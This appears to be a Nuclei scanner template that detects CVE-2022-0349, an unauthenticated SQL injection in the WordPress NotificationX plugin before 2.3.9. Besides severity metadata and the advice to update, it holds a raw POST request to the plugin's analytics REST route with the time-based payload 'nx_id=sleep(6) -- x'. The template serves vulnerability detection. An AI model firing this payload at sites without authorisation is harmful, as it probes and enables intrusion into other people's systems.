id: CVE-2022-0349
info:
  name: WordPress NotificationX <2.3.9 - SQL Injection
  author: edoardottt
  severity: critical
  description: The WordPress NotificationX plugin before version 2.3.9 is vulnerable
    to SQL injection, which could allow an unauthenticated attacker to obtain sensitive
    information or execute unauthorized actions on the affected site.
  reference:
  - https://wpscan.com/vulnerability/1d0dd7be-29f3-4043-a9c6-67d02746463a
  - https://wordpress.org/plugins/notificationx/advanced/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0349
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0349
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress NotificationX <2.3.9 can
      impact the affected site by allowing unauthorized access to sensitive information,
      modifying data, and executing unauthorized administrative operations.
    recommendation: It is recommended to update the WordPress NotificationX plugin
      to version 2.3.9 or later to address the SQL injection vulnerability.
  tags: cve2022,wordpress,wp-plugin,wp,sqli,notificationx,wpscan,cve
requests:
- raw:
  - '@timeout: 15s

    POST /?rest_route=/notificationx/v1/analytics HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    nx_id=sleep(6) -- x

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(body, "\"data\":{\"success\":true}")
    condition: and
